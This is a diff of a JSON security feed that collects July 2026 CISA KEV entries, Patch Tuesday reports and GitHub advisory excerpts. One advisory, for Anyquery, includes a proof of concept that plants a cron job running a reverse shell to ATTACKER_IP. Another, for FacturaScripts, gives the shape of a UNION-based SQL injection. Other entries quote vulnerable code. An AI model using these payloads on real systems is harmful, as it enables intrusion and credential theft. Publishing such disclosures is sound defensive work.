@@ -1,10 +1,48 @@
 {
-  "generated": "2026-07-14T13:02:19.994908+00:00",
-  "total": 29,
-  "kev": 0,
-  "zero_day": 15,
+  "generated": "2026-07-14T18:59:20.458285+00:00",
+  "total": 32,
+  "kev": 2,
+  "zero_day": 19,
   "enriched": 0,
   "findings": [
+    {
+      "id": "CVE-2026-56164",
+      "title": "CVE-2026-56164 \u2014 Microsoft SharePoint Server Missing Authentication for Critical Function Vulnerability",
+      "summary": "Vendor: Microsoft | Product: SharePoint Server. Microsoft SharePoint contains a missing authentication for critical function vulnerability that allows an unauthorized attacker to elevate privileges over a network. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-17)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-56164",
+      "published": "2026-07-14",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-56164"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-56155",
+      "title": "CVE-2026-56155 \u2014 Microsoft Active Directory Federation Services Insufficient Granularity of Access Control Vulnerability ",
+      "summary": "Vendor: Microsoft | Product: Active Directory Federation Services. Microsoft Active Directory Federation Services contains an insufficient granularity of access control vulnerability that allows an authorized attacker to elevate privileges locally. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-28)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-56155",
+      "published": "2026-07-14",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-56155"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -38,6 +76,55 @@
       "is_high_severity": true
     },
     {
+      "id": "https://www.securityweek.com/microsoft-patches-record-622-vulnerabilities-including-two-exploited-zero-days/",
+      "title": "Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days",
+      "summary": "Two flaws in Active Directory and SharePoint Server have been exploited as zero-days, and a BitLocker bug was publicly disclosed. The post Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days appeared first on SecurityWeek .",
+      "link": "https://www.securityweek.com/microsoft-patches-record-622-vulnerabilities-including-two-exploited-zero-days/",
+      "published": "2026-07-14T18:50:20+00:00",
+      "source": "SecurityWeek",
+      "tags": [
+        "news",
+        "research"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.tenable.com/blog/microsofts-july-2026-patch-tuesday-addresses-569-cves-cve-2026-56155-cve-2026-56164",
+      "title": "Microsoft\u2019s July 2026 Patch Tuesday Addresses 569 CVEs (CVE-2026-56155, CVE-2026-56164)",
+      "summary": "56 Critical 510 Important 3 Moderate 0 Low Microsoft addresses 569 CVEs in the largest Patch Tuesday release yet. This month\u2019s release includes three zero-days, two of which were exploited in the wild. Microsoft patched 569 CVEs in its July 2026 Patch Tuesday release, with 56 rated critical, 510 rated as important, and 3 rated as moderate. This marks the largest Patch Tuesday release ever, crushing the previous record of 198 CVEs in June . Last week, Microsoft announced that its multi-model agentic scanning harness (MDASH) is being used to identify vulnerabilities faster and noted that \u201ccustomers will see a higher volume of security updates included in each security release.\u201d This month\u2019s update includes patches for: .NET .NET Core .NET Framework ASP.NET Core Active Directory Certificate Services (AD CS) Active Directory Domain Services Active Directory Federation Services (AD FS) Azure Active Directory Azure CycleCloud Azure Monitor Agent Azure Spring Apps Code Integrity DLL (ci.dll) Composite Image File System Driver Content Delivery Manager Desktop Window Manager Extensible Storage Engine (ESENT) GitHub Copilot and Visual Studio GitHub Copilot and Visual Studio Code Github Copilot HTTP/2 Microsoft 365 Copilot for iOS Microsoft Bing App for IOS Microsoft Copilot Microsoft Defender Microsoft Defender for Endpoint Microsoft Dynamics NAV Microsoft Edge for Android Microsoft Exchange Server Microsoft Fabric Data Warehouse Microsoft Graphics Component Microsoft Input Method Editor (IME) Microsoft Install Service Microsoft NAT Helper Components (ipnathlp.dll) Microsoft Office Microsoft Office Excel Microsoft Office OneNote Microsoft Office PowerPoint Microsoft Office SharePoint Microsoft Office Word Microsoft Printer Drivers Microsoft Surface Microsoft Windows Microsoft Windows App Store Microsoft Windows Codecs Library Microsoft Windows Media Foundation Microsoft Windows Search Component Microsoft Windows Speech Microsoft XML Microsoft XML Core Services Minecraft Bedro",
+      "link": "https://www.tenable.com/blog/microsofts-july-2026-patch-tuesday-addresses-569-cves-cve-2026-56155-cve-2026-56164",
+      "published": "2026-07-14T18:23:36+00:00",
+      "source": "Tenable Security Research",
+      "tags": [
+        "cloud",
+        "research",
+        "vuln"
+      ],
+      "cve_ids": [
+        "CVE-2026-56155",
+        "CVE-2026-56164"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/",
+      "title": "Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days",
+      "summary": "Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. [...]",
+      "link": "https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/",
+      "published": "2026-07-14T18:01:36+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
       "id": "https://www.securityweek.com/unpatched-claude-for-chrome-flaw-lets-extensions-read-gmail-calendar/",
       "title": "Unpatched Claude for Chrome Flaw Lets Extensions Read Gmail, Calendar",
       "summary": "A ClaudeBleed-linked vulnerability reportedly persists across eight patches, exposing potentially sensitive data to other extensions. The post Unpatched Claude for Chrome Flaw Lets Extensions Read Gmail, Calendar appeared first on SecurityWeek .",
@@ -53,6 +140,23 @@
       "is_high_severity": true
     },
     {
+      "id": "https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed",
+      "title": "CVE-2026-55040: Microsoft SharePoint JWT Token Authentication Bypass (FIXED)",
+      "summary": "Overview Rapid7 Labs conducted a zero-day research project against Microsoft SharePoint, resulting in the discovery of two new vulnerabilities that, when chained together, achieve unauthenticated remote code execution (RCE) against a vulnerable SharePoint server. Today, both Rapid7 and Microsoft are disclosing the first vulnerability in this chain, the authentication bypass vulnerability CVE-2026-55040. The RCE component of the exploit chain is expected to be patched by Microsoft in the next update cycle for August 2026. The exploit chain was developed as an entry for the recent Pwn2Own Berlin hacking competition \u2013 part of Rapid7 Labs' continued effort to raise the bar in Vulnerability Intelligence and our commitment to the preemptive protection of our customers through original vulnerability research. A remote unauthenticated attacker can leverage CVE-2026-55040 to bypass authentication on a vulnerable SharePoint server and perform operations as a SharePoint site user or administrator. The vulnerability is due to several issues in the JWT token validation pipeline. CVE-2026-55040 has a CVSSv3.1 score of 9.1 (Critical) , and a Common Weakness Enumeration (CWE) of CWE-1390: Weak Authentication . Product description Microsoft SharePoint is a ubiquitous, web-based collaboration and document management platform deeply integrated into the Microsoft 365 ecosystem. Serving as the central hub for corporate intranets, internal file sharing, and workflow automation, it is trusted by enterprises worldwide to store and manage vast repositories of sensitive business data. Because SharePoint acts as a critical bridge between internal users, active directories, and cloud infrastructure, vulnerabilities within its architecture present a high-risk attack surface. Impact By leveraging CVE-2026-55040, a remote unauthenticated attacker can assume the identity of any SharePoint site user; the prerequisite is the attacker must know in advance the user they wish to identify as. This can b",
+      "link": "https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed",
+      "published": "2026-07-14T13:00:00+00:00",
+      "source": "Rapid7 Blog",
+      "tags": [
+        "research",
+        "metasploit"
+      ],
+      "cve_ids": [
+        "CVE-2026-55040"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
       "id": "https://www.securityweek.com/us-allies-warn-of-russian-cyberattacks-targeting-critical-infrastructure-routers/",
       "title": "US, Allies Warn of Russian Cyberattacks Targeting Critical Infrastructure Routers",
       "summary": "Multiple state-sponsored APTs are compromising poorly secured devices across critical infrastructure sector networks. The post US, Allies Warn of Russian Cyberattacks Targeting Critical Infrastructure Routers appeared first on SecurityWeek .",
@@ -62,21 +166,6 @@
       "tags": [
         "news",
         "research"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-actively-exploited-rce-flaws-in-joomla-extensions/",
-      "title": "CISA warns of actively exploited RCE flaws in Joomla extensions",
-      "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) is warning that attackers are exploiting vulnerabilities in the iCagenda and Balbooa Forms extensions for Joomla to achieve remote code execution through arbitrary file uploads. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-actively-exploited-rce-flaws-in-joomla-extensions/",
-      "published": "2026-07-13T15:20:16+00:00",
-      "source": "Bleeping Computer",
-      "tags": [
-        "news",
-        "malware"
       ],
       "cve_ids": [],
       "is_zero_day": true,
@@ -241,6 +330,147 @@
       "is_high_severity": false
     },
     {
+      "id": "https://www.bleepingcomputer.com/news/security/progress-confirms-sharefile-zero-day-flaw-behind-storage-zone-shutdown/",
+      "title": "Progress confirms ShareFile zero-day flaw behind Storage Zone shutdown",
+      "summary": "Progress Software has confirmed that a high-severity zero-day vulnerability is behind the emergency shutdown of ShareFile Storage Zone Controllers last week\u00a0and has released security updates to patch the flaw. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/progress-confirms-sharefile-zero-day-flaw-behind-storage-zone-shutdown/",
+      "published": "2026-07-14T16:08:47+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-50006",
+      "title": "Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode",
+      "summary": "## Summary\nAnyquery's `server` mode does not disable or restrict native SQLite disk manipulation commands. Unauthenticated attackers connecting to the MySQL-compatible server port can use the `ATTACH DATABASE` command to write arbitrary SQLite databases to any path on the victim's filesystem where the process has write permissions. This leads to Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) depending on the environment (e.g., by dropping a PHP web shell if a web server is running, or overwriting system cronjobs if running as root).\n\n## Details\nWhen Anyquery is launched in **Server Mode** (`anyquery server`), it blindly proxies incoming SQL commands to the underlying SQLite engine. SQLite allows dynamic database mounting via the `ATTACH DATABASE` command, which creates a physical `.db` file on the filesystem if the file does not exist.\n\nAn attacker can connect to the open Anyquery port, attach a new database to a sensitive path (e.g., `/var/www/html/shell.php`, `/etc/cron.d/pwn` or `/root/.ssh/authorized_keys`), create a table, and insert a malicious payload. Although the file will contain a binary SQLite header, standard Linux services like `cron`, `sshd`, and web servers like `PHP` tolerate garbage data and will parse/execute the valid payload lines injected by the attacker.\n\n## PoC (Proof of Concept)\n1. Start the server on the victim machine:\n   ```bash\n   anyquery server --host 0.0.0.0 --port 8070\n   ```\n2. Connect from an attacker machine:\n   ```bash\n   mysql -u root -h <VICTIM_IP> -P 8070\n   ```\n3. Execute the payload to write a malicious cronjob for native RCE (Note: the Anyquery process must have write permissions to the target directory, such as `/etc/cron.d` or `/var/spool/cron/crontabs/`):\n   ```sql\n   ATTACH DATABASE '/etc/cron.d/pwn' AS pwn;\n   CREATE TABLE pwn.task (cmd TEXT);\n   INSERT INTO pwn.task VALUES ('* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1\"');\n   ```\n\n   *Alternatively, if a web server",
+      "link": "https://github.com/advisories/GHSA-xrcf-6jh3-ggvx",
+      "published": "2026-07-14T18:33:57Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-50006"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-50131",
+      "title": "Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges",
+      "summary": "### Summary\n\nFedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.\n\nThe `validatePublicUrl()` protection relies on `isValidPublicIPv4Address()` to reject non-public IPv4 destinations. The function blocks common private and local ranges such as `10.0.0.0/8`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, and `192.168.0.0/16`, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.\n\nBecause this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.\n\nI tested this against the current repository code at unreleased version 2.3.0. I used `>=0.11.2, <=2.2.3` as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.\n\n### Why this is not a duplicate of GHSA-p9cg-vqcc-grcx\n\nGHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.\n\nThis report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.\n\nThe affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.\n\n### Affected Code\n\nAffected file:\n\n`packages/vocab-runtime/src/url.ts`\n\nCurrent IPv4 validation logic:\n\n```ts\nexport function isValidPublicIPv4Addres",
+      "link": "https://github.com/advisories/GHSA-xw9q-2mv6-9fr8",
+      "published": "2026-07-14T18:15:25Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-50131"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-50125",
+      "title": "MKP: Unbounded Pod Log Read via Attacker-Controlled `limitBytes`/`tailLines` Causes Memory Exhaustion",
+      "summary": "## Unbounded Pod Log Read via Attacker-Controlled `limitBytes`/`tailLines` Causes Memory Exhaustion\n\n### Summary\n\nThe MKP (Model Context Protocol for Kubernetes) server exposes a `get_resource` MCP tool that proxies Kubernetes pod log requests. User-supplied `limitBytes` and `tailLines` parameters are parsed as unbounded `int64` values and forwarded directly to the Kubernetes API. The server then reads the entire returned log stream into an in-memory `bytes.Buffer` using `io.Copy` without any application-side size cap. A remote unauthenticated attacker can exploit this to exhaust the MKP server's memory by sending a single crafted `tools/call` request, leading to process termination (OOM kill) and denial of service. Dynamic reproduction confirmed the MKP process RSS grew from 25.8 MB to 1,179.3 MB (+1,153.4 MB) while handling one request with `limitBytes=134217728`.\n\n### Details\n\nThe vulnerability exists in `pkg/k8s/subresource.go` in the `buildPodLogOpts()` and `defaultGetPodLogs()` functions.\n\n**Source \u2014 unbounded parameter parsing (`pkg/k8s/subresource.go:171\u2013181`):**\n\n```go\n// pkg/k8s/subresource.go\ndefaultLimitBytes := int64(32 * 1024) // 32 KB \u2014 only used when parameters map is nil\n...\nif limitBytes, ok := parameters[\"limitBytes\"]; ok {\n    if b, err := strconv.ParseInt(limitBytes, 10, 64); err == nil {\n        podLogOpts.LimitBytes = &b  // no upper-bound check\n    }\n}\nif tailLines, ok := parameters[\"tailLines\"]; ok {\n    if lines, err := strconv.ParseInt(tailLines, 10, 64); err == nil {\n        podLogOpts.TailLines = &lines  // no upper-bound check\n    }\n}\n```\n\nWhen the `parameters` map is non-nil (always true for attacker-supplied input), `buildPodLogOpts()` is called at `pkg/k8s/subresource.go:94\u201396` and overwrites the 32 KB default entirely. The attacker can therefore supply any positive `int64` value (up to `2147483647` or `9223372036854775807`) as `limitBytes`.\n\n**Sink \u2014 unbounded in-memory copy (`pkg/k8s/subresource.go:114\u2013115`):**\n\n```go\nbuf := new(by",
+      "link": "https://github.com/advisories/GHSA-qw5r-ppcg-f8rj",
+      "published": "2026-07-14T18:09:48Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-50125"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2025-61670",
+      "title": "Wasmtime: Memory leak in C API with `externref` and `anyref` types",
+      "summary": "### Impact\n\nWasmtime 37.0.0 and 37.0.1 have memory leaks in the C/C++ API when using bindings for the `anyref` or `externref` WebAssembly values. This is caused by a regression introduced during the development of 37.0.0 and all prior versions of Wasmtime are unaffected. If `anyref` or `externref` is not used in the C/C++ API then embeddings are also unaffected by the leaky behavior. The `wasmtime` Rust crate is unaffected by this leak.\n\nDevelopment of Wasmtime 37.0.0 included a refactoring in Rust of changing the old `ManuallyRooted<T>` type to a new `OwnedRooted<T>` type. This change was integrated into Wasmtime's C API but left the C API in a state which had memory leaks. Additionally the new ownership semantics around this type were not reflected into the C++ API, making it leak-prone. A short version of the change is that previously `ManuallyRooted<T>`, as the name implies, required manual calls to an \"unroot\" operation. If this was forgotten then the memory was still cleaned up when the `wasmtime_store_t` itself was destroyed eventually. Documentation of when to \"unroot\" was sparse and there were already situations prior to 37.0.0 where memory would be leaked until the store was destroyed anyway. All memory, though, was always bound by the store, and destroying the store would guarantee that there were no memory leaks.\n\nIn migrating to `OwnedRooted<T>` the usage of the type in Rust changed. A manual \"unroot\" operation is no longer required and it happens naturally as a destructor of the `OwnedRooted<T>` type in Rust itself. These new resource ownership semantics were not fully integrated into the preexisting semantics of the C/C++ APIs in Wasmtime. A crucial distinction of `OwnedRooted<T>` vs `ManuallyRooted<T>` is that the `OwnedRooted<T>` type allocates host memory outside of the store. This means that if an `OwnedRooted<T>` is leaked then destroying a store does not release this memory and it's a permanent memory leak on the host. This led to a few distinct",
+      "link": "https://github.com/advisories/GHSA-vvp9-h8p2-xwfc",
+      "published": "2026-07-14T17:48:35Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2025-61670"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-45693",
+      "title": "FacturaScripts: Unauthenticated Path Traversal in Static File Controllers Reads Private MyFiles Documents",
+      "summary": "### Summary\n\nThe static file controllers in FacturaScripts decide whether a request is authorized by looking at the URL string instead of the canonical filesystem path. A request that starts with an allow-listed folder name but contains a `../` segment in the middle ends up serving a file from a different directory than the one the URL pretended to point at. This makes any file inside the FacturaScripts installation readable without authentication as long as the file's extension is on the controllers' allow-list (`pdf`, `xlsx`, `docx`, `csv`, `sql`, `zip`, `xml`, `json`, `xsig`, etc.). In practice this leaks the documents the application is specifically designed to protect: customer invoices, supplier invoices, document attachments and database backups stored under `MyFiles/Private/` and other non-public subfolders.\n\nThe two vulnerable controllers are `Core/Controller/Files.php` (used by the `/Plugins/*`, `/Core/Assets/*`, `/Dinamic/Assets/*` and `/node_modules/*` routes) and `Core/Controller/Myfiles.php` (used by `/MyFiles/*`). Both share the same root cause: a `strpos()` / `substr()` prefix check on the raw URL is treated as proof that the resolved file lives inside an authorized directory.\n\nThe `/Plugins/*` route via `Files.php` is the cleanest exploit path because `Plugins/` is part of every FacturaScripts installation, so no precondition is required. The `/MyFiles/*` route via `Myfiles.php` is a second path with the same root cause: when the URL starts with `/MyFiles/Public/`, the controller exits early and skips the per-file `myft` token check, which can be combined with `../` to read tokenless files outside `Public/`.\n\nTested live on commit `de01369` (master, 2026-05-11) and on tag `v2026.2`, with PHP 8.0.30 on Apache 2.4.56.\n\n### Details\n\n#### Path 1, in `Core/Controller/Files.php`\n\n`Files::__construct` concatenates the project folder with the request URL and then runs two safety checks before serving the file:\n\n```php\n$this->filePath = Tools::folder() . $ur",
+      "link": "https://github.com/advisories/GHSA-cv65-7cg8-r623",
+      "published": "2026-07-14T17:12:56Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-45693"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-45262",
+      "title": "FacturaScripts: Authenticated SQL injection in the FacturaScripts REST API filter parameter via parenthesis bypass in `Where::sqlColumn`",
+      "summary": "## Summary\n\n> **Live PoC verified 2026-04-30** against a stock FacturaScripts master at `127.0.0.1:8081`. A scoped `ApiKey` with `fullaccess=0` and an `ApiAccess` row granting `allowget=1` on the `clientes` resource only (no other rights, no UI session, no admin) issued one `GET /api/3/clientes?filter[(0)UNION%20SELECT%20...]=` request and the response body contained the raw bcrypt hash of the admin user's password (`$2y$12$sLfA/XCqnjqLmYJwK.2V7eUHrHTHcQfkTYYfs1.lxX3OHrsmmkMGO`) and the admin's `logkey` cookie value. The leaked `logkey` was injected into a fresh cookie jar and `GET /AdminPlugins` returned 200 with the admin plugin management UI. End-to-end account takeover from a read-only token with no CSRF, no second factor, no rate-limit interaction beyond the default 5-incident IP throttle.\n\n`Core/Where.php::sqlColumn()` exempts any field name that contains both `(` and `)` from identifier escaping. The two API filter builders (`APIModel::getWhereValues` and `ApiAttachedFiles::getWhereValues`) feed the raw request key (`$_GET['filter'][$key]`) straight into `new DataBaseWhere($key, $value, '=', ...)`. When the model's `all()` reaches `Where::multiSqlLegacy` -> `Where::sql()` -> `Where::sqlColumn($key)`, the parenthesis branch returns the attacker-controlled string unmodified. The string is concatenated into `WHERE <attacker> = '<value>'`, which an attacker can pivot to `WHERE (0)UNION SELECT ... FROM users WHERE(nick='admin')-- = 'value'`, leaking arbitrary columns from any table.\n\n## Details\n\n### the API filter pipeline never validates filter keys\n\n`Core/Lib/API/APIModel.php:300-322` (`listAll`):\n\n```php\nprotected function listAll(): bool\n{\n    $filter = $this->request->query->getArray('filter');\n    $limit = $this->request->query->getInt('limit', 50);\n    $offset = $this->request->query->getInt('offset', 0);\n    $operation = $this->request->query->getArray('operation');\n    $order = $this->request->query->getArray('sort');\n\n    // obtenemos los registros\n    $",
+      "link": "https://github.com/advisories/GHSA-5qmh-x653-g8qj",
+      "published": "2026-07-14T17:11:06Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-45262"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44300",
+      "title": "OpenCost ServiceKey Endpoint Unauthorized Credential Overwrite/Injection",
+      "summary": "## Summary\n\nOpenCost contains an unauthenticated  file write vulnerability in the `/serviceKey` endpoint that allows remote attackers to overwrite the GCP service account key file without authentication. This can lead to service disruption, credential theft, and potential privilege escalation within Kubernetes clusters.\n\n---\n\n\n## Affected Versions\n\n- **OpenCost**: All versions up to and including the latest release\n- **Vulnerable File**: `pkg/costmodel/router.go` (lines 365-379)\n- **Vulnerable Endpoint**: `POST /serviceKey`\n\n---\n\n## Vulnerability Details\n\n### Root Cause\n\nThe `AddServiceKey` function in `pkg/costmodel/router.go` accepts user-supplied data via POST request and writes it directly to a file without any authentication or input validation:\n\n```go\nfunc (a *Accesses) AddServiceKey(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {\n    w.Header().Set(\"Content-Type\", \"application/json\")\n    w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")  // Overly permissive CORS\n\n    r.ParseForm()\n\n    key := r.PostForm.Get(\"key\")  // User-controlled input, no validation\n    k := []byte(key)\n    err := os.WriteFile(env.GetGCPAuthSecretFilePath(), k, 0644)  //  Direct file write\n    if err != nil {\n        fmt.Fprintf(w, \"Error writing service key: %s\", err)\n    }\n\n    w.WriteHeader(http.StatusOK)\n}\n```\n\n**File Path Determination** (`core/pkg/env/core.go`):\n```go\nfunc GetGCPAuthSecretFilePath() string {\n    return GetPathFromConfig(\"key.json\")\n}\n\nfunc GetPathFromConfig(fileName string) string {\n    return filepath.Join(GetConfigPath(), fileName)\n}\n\nfunc GetConfigPath() string {\n    return Get(ConfigPathEnvVar, DefaultConfigPath)  // Default: /var/configs\n}\n```\n\n### Security Issues\n\n1. **No Authentication**: Any network-accessible client can invoke the endpoint\n2. **No Input Validation**: User input is not validated as a valid GCP service account key\n3. **Overly Permissive CORS**: `Access-Control-Allow-Origin: *` allows cross-origin attacks\n4. **Predictable Fi",
+      "link": "https://github.com/advisories/GHSA-wmj8-9953-vff5",
+      "published": "2026-07-14T17:07:53Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44300"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "CVE-2026-52828",
       "title": "Kimai: ExportTemplate CRUD Missing Authorization Check Allows Unauthorized TEAMLEAD Access",
       "summary": "### Summary\n\nThe `ExportController` web routes for creating and editing export templates are gated only by the class-level `create_export` permission, which is granted to `ROLE_TEAMLEAD` by default. The corresponding API routes and UI button visibility correctly require the stricter `create_export_template` permission, which is granted only to `ROLE_ADMIN` and `ROLE_SUPER_ADMIN`. A TEAMLEAD user can directly access the template create/edit routes to create or modify global export templates that are visible to all users including administrators.\n\n### Details\n\nThe `ExportController` applies the class-level annotation `#[IsGranted('create_export')]`.\n\nThe `createExportTemplate` (line 210) and `editExportTemplate` (line 220) methods have no method-level `#[IsGranted('create_export_template')]` annotation. The permission hierarchy in `config/packages/kimai.yaml:103,115,122-123` grants `create_export` to `ROLE_TEAMLEAD` via the `EXPORT` permission set, but `create_export_template` only to `ROLE_ADMIN` and `ROLE_SUPER_ADMIN`.\n\nThe API controller correctly requires `create_export_template`. The UI template (`templates/export/index.html.twig:124`) correctly hides the create button behind `create_export_template`. Only the web controller routes are missing the check.\n\n`ExportTemplate` entities are global \u2014 they have no per-user or per-team scoping (`src/Entity/ExportTemplate.php:19-56`). Any template created or modified by a TEAMLEAD which is marked as \"Available for all users\" is visible to and usable by every user in the instance.\n\n*A PoC was provided, but removed for security reasons.*\n\n### Impact\n\nAny user with `ROLE_TEAMLEAD` can create and modify global export templates intended to be managed only by administrators. The templates control the structure and content of exported data (columns, renderer, format). While the impact is limited to data integrity manipulation of a non-security-critical resource (no RCE, no credential exposure), it violates the intended permission",
@@ -290,186 +520,6 @@
       ],
       "cve_ids": [
         "CVE-2026-47677"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-61667",
-      "title": "DIRAC is vulnerable to RCE in FileCatalog DatasetManager via SQL injection + eval",
-      "summary": "### Summary\nThe FileCatalog DatasetManager runs a query on the database and passes the result to eval. The SQL query contains an injection vulnerability which allows an authenticated user to control the parameter returned to the eval resulting in remote code execution.\n\n### Details\n\nThe FileCatalog checkDataset function passes its datasets argument directly to the backend DB handler:\nhttps://github.com/DIRACGrid/DIRAC/blob/f7e0a3ac153315030fb3520e8ca747f013758967/src/DIRAC/DataManagementSystem/Service/FileCatalogHandler.py#L591-L593\n\nWhich in turn passes it to the __checkDataset function:\nhttps://github.com/DIRACGrid/DIRAC/blob/f7e0a3ac153315030fb3520e8ca747f013758967/src/DIRAC/DataManagementSystem/DB/FileCatalogComponents/DatasetManager/DatasetManager.py#L390\n\nThis uses an f-string to create a query without escaping, resulting in an SQL injection:\nhttps://github.com/DIRACGrid/DIRAC/blob/f7e0a3ac153315030fb3520e8ca747f013758967/src/DIRAC/DataManagementSystem/DB/FileCatalogComponents/DatasetManager/DatasetManager.py#L400-L402\n\nThe result (which is user controllable due to the SQL injection) is passed into eval almost immediately on return, leading to code execution:\nhttps://github.com/DIRACGrid/DIRAC/blob/f7e0a3ac153315030fb3520e8ca747f013758967/src/DIRAC/DataManagementSystem/DB/FileCatalogComponents/DatasetManager/DatasetManager.py#L409\n\nThere are other functions in the same file which use a similar pattern and would likely be exploitable in a similar way.\n\n### Impact\nThis allows any authenticated user to run commands on the server, which allows a full compromise of the DIRAC system (they can read the local dirac.cfg, get database passwords and export all stored proxies and tokens). If local logging is used, they can also remove evidence of the exploit from the log.\n\n### Patched versions:\nhttps://pypi.org/project/DIRAC/8.0.79/\nhttps://pypi.org/project/DIRAC/9.0.22/\nhttps://pypi.org/project/DIRAC/9.1.10/",
-      "link": "https://github.com/advisories/GHSA-m4m7-4cw8-62j6",
-      "published": "2026-07-13T18:37:31Z",
